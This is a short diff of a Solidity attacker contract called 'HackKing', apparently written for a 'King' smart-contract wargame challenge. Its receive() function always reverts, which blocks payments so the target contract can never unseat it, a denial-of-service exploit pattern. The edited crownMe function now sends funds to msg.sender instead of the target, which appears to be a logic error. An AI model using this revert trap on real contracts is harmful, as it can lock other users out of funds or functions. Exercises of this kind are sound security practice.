@@ -8,12 +8,14 @@ contract HackKing {
     kingContract = _kingContract;
   }
 
-  function crownMe(uint _value, uint _gas) public {
-    address(kingContract).call.value(_value).gas(_gas);
+  function crownMe(uint _amount) public {
+    (bool success, ) = msg.sender.call.value(_amount)("");
+    require(success, "Transfer failed.");
   }
 
   receive() external payable {
     revert();
+
   }
 
 }
